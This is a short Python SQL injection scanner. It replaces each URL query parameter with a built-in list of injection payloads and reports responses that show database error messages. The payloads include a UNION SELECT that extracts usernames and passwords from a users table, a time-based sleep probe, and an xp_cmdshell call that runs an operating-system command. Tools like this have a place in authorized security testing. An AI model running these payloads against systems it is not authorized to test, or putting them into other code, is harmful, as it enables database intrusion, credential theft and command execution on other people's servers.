import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

def check_sqli(url, payloads=None):
    # Use a broader set of SQLi payloads if none are provided
    if not payloads or len(payloads) == 0:
        payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 'a'='a",
            "' OR 1=1#",
            "' OR 1=1/*",
            "'; EXEC xp_cmdshell('whoami')--",
            "' AND 1=0 UNION SELECT NULL,NULL,NULL--",
            "' OR sleep(5)--",
            "' AND (SELECT COUNT(*) FROM users) > 0--",
            "' UNION SELECT username, password FROM users--"
        ]
    
    vulnerabilities = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    # If no query parameters exist, then nothing to test.
    if not params:
        return vulnerabilities

    for param in params:
        for payload in payloads:
            new_params = params.copy()
            new_params[param] = payload
            new_query = urlencode(new_params, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))
            try:
                res = requests.get(test_url, timeout=5)
                # Check for common SQL error messages in the response
                lower_text = res.text.lower()
                if any(err in lower_text for err in [
                    "sql syntax", "mysql", "microsoft odbc", "oracle", "syntax error",
                    "warning", "unterminated", "quoted string not properly terminated", "fatal error", "pdo"
                ]):
                    vulnerabilities.append(
                        f"SQLi vulnerability on parameter '{param}' using payload: {payload}\n→ {test_url}"
                    )
            except Exception:
                continue
    return vulnerabilities
